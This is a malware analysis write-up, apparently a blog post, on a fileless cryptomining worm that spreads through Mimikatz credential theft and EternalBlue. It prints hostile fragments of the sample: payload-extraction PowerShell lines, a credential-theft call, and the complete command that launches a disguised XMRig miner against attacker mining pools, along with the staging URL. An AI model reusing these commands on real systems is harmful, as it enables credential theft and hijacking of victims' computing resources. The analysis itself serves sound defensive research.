@@ -1,0 +1,178 @@
+
+Advanced 'all in memory' CryptoWorm
+
+
+
+
+Introduction.
+
+
+Today I want to share a nice Malware analysis having an interesting flow. The "interesting" adjective comes from the abilities the given sample owns. Capabilities of exploiting, hard obfuscations and usage of advanced techniques to steal credentials and run commands. 
+
+
+The analyzed sample has been provided by a colleague of mine (Alessandro) who received the first stage by eMail. A special thanks to Luca and Edoardo for having recognized XMRig during the last infection stage.   
+
+General View.
+
+The following image shows the general view of the entire attack path. As you might appreciate from the picture, that flow could be considered a complex flow since many specific artifacts were included in the attack phases.  The initial stage starts by abusing the user inexperience taking him/her to click on a first stage file called  (in my case) y1.bat. Nowadays eMail vector is one of the most favorite vectors used by attackers and easily implemented to deliver malicious contents. Once the first stage is run, it downloads and executes a second stage file called info6.ps1: a heavy obfuscated PowerShell script which drops (by de-obfuscate it directly on body) three internal resources: 
+
+
+Mimikatz.dll. This module is used to steal user administrative credentials.
+Utilities. This module is used to scan internal networks in order to propagate the infection, it is used to run several internal utilities such as (but not limited to): de-obfuscation routines,  ordering arrays and running exploits. This module is also used to drop and execute an additional file (from the same server) named info.vbs.
+Exploits. This module is a set of known exploits such as eternalblue7_exploit and eternal_blue_powershell used from the initial stage of attack to infect internal machines .
+
+
+
+Full Stage Attack Path
+
+
+
+
+
+The last stage (info.vbs) drops and runs an executable file which has been recognized to be XMRig. XMRig is an open sourced Monero CPU Miner, freely available on github. The infection tries to propagate itself by scanning and attacking internal resources through the Exploit module, while the XMRig module mines Monero cryptocurrency giving to the attacker fresh "crypto money" by stealing victims resources. 
+
+Analysis.
+A romantic but still "working" .bat file is propagated to the victim by email or message. Once the user clicks on it, the .bat file would run the following command spawning a powershell able to download and run a script called info6.ps1 from http://118.184.48.95:8000/
+
+
+
+
+
+Stage1: Downloads and Run 
+
+
+The downloaded powershell file is clearly divided into two macro blocks both of them obfuscated. The following image shows the two visual sections which I am going to call them: "half up" (section before the "new line") and "half down" (section after the "new line").
+
+
+
+
+Stage2: Two Visual Sections to be explored
+
+
+While the "half up" section fairly appears to be a Base64 encoded text file, the "half down" section looks like encoded through a crafted function which, fortunately (and certain), appears in clear text at the end of such a file. By editing that function it is possible to modify the decoding process making it saving the decoded text file directly to a desired folder. The following image shows the decoded second stage "half dow" section.  
+
+
+
+
+Decoded Second Stage "Half Down"
+
+
+Analyzing the section code it would be easy to agree that the main used functions are dynamically extracted from the file itself, by performing a substring operations on the current content.
+
+
+
+
+$funs=$fa.SubsTrIng(0,406492)
+
+
+
+
+$mimi=$fa.sUBStrInG(406494,1131864)
+
+
+
+
+$mon=$fa.suBstrING(1538360,356352)
+
+
+
+$vcp=$fa.sUBStRiNG(1894714,880172)
+
+
+$vcr=$fa.sUBstrINg(2774888,1284312)
+
+$sc=$fa.sUBsTrinG(4059202)
+
+
+  
+
+The content of $fa variable and every function related to it is placed in the "half up" section which after being decoded looks like the following image.
+
+
+
+
+Decoded Second Stage "Half Up"
+
+
+The second stage "half up" code is borrowed from Kevin Robertson (Irken), the attacker reused many useful functionalities from Irken including the Invoke-TheHas routine which could be used through SMB to execute commands or to executes direct code having special rights. 
+
+
+
+A surprisingly interesting line of code is found on the same stage (Second stage "half down"): NTLM= Get-creds mimi mimi  where the Get-creds function (coming from the Based64 decoded "half up") runs, by using the reflectoin techique, a DLL function. So by definition the mimi parameter has to be a DLL file included somewhere in the code. Let's grab it by running the following code: $fa.sUBStrInG(406494,1131864) Where 406494 is the start character and the 1131864 is the last character to be interpreted as a dynamic loaded library. Fortunately the dropped DLL is a well known library, widely used in penetration testing named Mimikatz. It would be clear that the attacker uses the Mimikatz library to grab user (and eventually administrators) passwords. Once the passwords stealing activity is done the Malware starts to scan internal networks for known vulnerabilities such as MS17/10. The identified exploits have been borrowed from tevora-thrat and woravit since same peace of codes, same comments and same variable names have been found. If the Malware finds vulnerability on local area networks it tries to infect the machine by injecting itself (info6.ps1) through EthernalBlue and then it begins its execution from the second Stage.
+
+
+
+On the same thread the Malware drops and runs a .vbs file (Third Stage) and it gets persistence through WMIClass on service.
+
+
+
+
+Introducing the Third Stage
+
+
+ 
+
+ The info.vbs drops and executes from itself a compiled version of XMRIG renamed with the "mimetic" string: taskservice.exe.  Once the compiled PE file (XMRig) is placed in memory the new stage starts it by running the following commands.
+
+
+
+
+Third Stage Execution of Monero Miner
+
+
+The clear text Monero address is visible on the code. Unfortunately the Monero address is not trackable so far. 
+
+
+
+Monero address: 46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE 
+
+
+
+and the used server is: stratum+tcp://pool.supportxmr.com:80
+
+w.run "%temp%\taskservice.exe  -B -o stratum+tcp://pool.supportxmr.com:80 -u  46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE  -o stratum+tcp://mine.xmrpool.net:80  -u  46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE -o stratum+tcp://pool.minemonero.pro:80   -u  46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE -p x" ,0
+
+Many interesting other sections should be analyzed but for now lets stop here.
+
+IOC.
+
+Please find some of the most interesting IoC for you convenience.
+
+- URL: http://118.184.48.95:8000/
+- Monero Address:  46CJt5F7qiJiNhAFnSPN1G7BMTftxtpikUjt8QXRFwFH2c3e1h6QdJA5dFYpTXK27dEL9RN3H2vLc6eG2wGahxpBK5zmCuE
+- Sha256: 19e15a4288e109405f0181d921d3645e4622c87c4050004357355b7a9bf862cc
+- Sha256: 038d4ef30a0bfebe3bfd48a5b6fed1b47d1e9b2ed737e8ca0447d6b1848ce309
+
+
+
+Conclusion.
+
+
+We are facing one of the first complex delivery of cryptocoin mining Malware. Everybody knows about CryptoMine, BitCoinMiner and Adylkuzz Malware which basically dropped on the target machine a BitCoin Miner, so if you are wondering: Why Marco do you write: "one of the first Malware" ? Well actually I wrote one of the "first complex" delivery. Usual coins Malware are delivered with no propagation modules, with no exploiting module and with not file-less techniques. In fact, the way this Monero CPU Miner has been delivered, includes advanced methodologies of memory inflation, where the unpacked Malware is not saved on Hard Drive (a technique to bypass some Anti Virus) but it is inflated directly on memory and called directly from memory itself. 
+
+
+
+
+
+We can consider this Malware as a last generation of -all in memory- CryptoWorm. 
+
+
+
+
+
+
+
+Another interesting observation, at least on my personal point of view, comes from the first stage. Why the attacker included this useless stage ? It appears to be not useful at all, it's a mere dropper wth no controls nor evasions. The attacker could have delivered just the second stage within the first stage in it, assuring a more stealth network fingerprint. So why the attacker decided to deliver the CryptoWorm through the first stage ? Maybe the first stage is part of a bigger framework ? Are we facing a new generation of Malware Generator Kits ? 
+
+
+
+I wont really answering to such a questions right now, but contrary I'd like to take my readers thinking about it.
+
+
+
+Have fun
+
+
+
+
+
